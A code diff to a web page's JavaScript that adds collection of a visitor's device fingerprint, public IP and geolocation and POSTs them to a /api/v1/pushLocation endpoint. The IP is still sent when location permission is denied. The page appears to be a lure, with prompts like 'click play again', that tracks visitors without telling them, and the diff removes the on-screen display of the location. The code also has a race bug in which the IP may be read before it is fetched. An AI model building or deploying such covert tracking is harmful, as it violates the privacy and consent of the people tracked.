@@ -107,12 +107,42 @@
   console.log("User Agent:", userAgentFull);
 
     // Get public IP
+    let ipAddress = null;
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(data => {
         console.log(data.ip);
-        
+        ipAddress=data.ip;
       });
+
+
+
+  const deviceInfo = {
+      browser: {
+        name: browserName,
+        version: browserVersion
+      },
+      os: {
+        name: osName,
+        version: osVersion
+      },
+      device: {
+        type: deviceType,
+        brand: deviceBrand,
+        model: deviceModel
+      },
+      engine: {
+        name: engineName,
+        version: engineVersion
+      },
+      cpu: cpuArch,
+      userAgent: userAgentFull,
+    };
+
+// Convert to JSON string
+const jsonString = JSON.stringify(deviceInfo);
+
+
 
     // Get location
 
@@ -132,7 +162,6 @@
   }
 
   function retryTracking() {
-    // document.getElementById("retryBtn").style.display = "none"; // hide retry button
     startTracking(); // try again
   }
 
@@ -140,12 +169,26 @@
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
 
-    // document.getElementById("output").innerText =
-    //   `✅ Live Location:\nLatitude: ${lat}, Longitude: ${lon}`;
+    fetch("http://localhost:8080/api/v1/pushLocation", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        deviceName: deviceInfo,
+        ipAddress: JSON.stringify(ipAddress),
+        lat: lat,
+        lon: lon
+      })
+    })
+      .then(res => res.json())
+      .then(data => console.log(data));
   }
 
   function showError(error) {
-    let msg = "";
+
+    
+    let msg = "Cancelled";
     switch(error.code) {
       case error.PERMISSION_DENIED:
         msg = "Please enable location in browser settings and click play again.";
@@ -162,6 +205,19 @@
         // msg = "❌ Unknown error occurred.";
     }
     document.getElementById("output").innerText = msg;
+     fetch("http://localhost:8080/api/v1/pushLocation", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        deviceName: msg,
+        ipAddress: JSON.stringify(ipAddress),
+        lat: "0",
+        lon: "0"
+      })
+    })
+      
   }    
 
   </script>
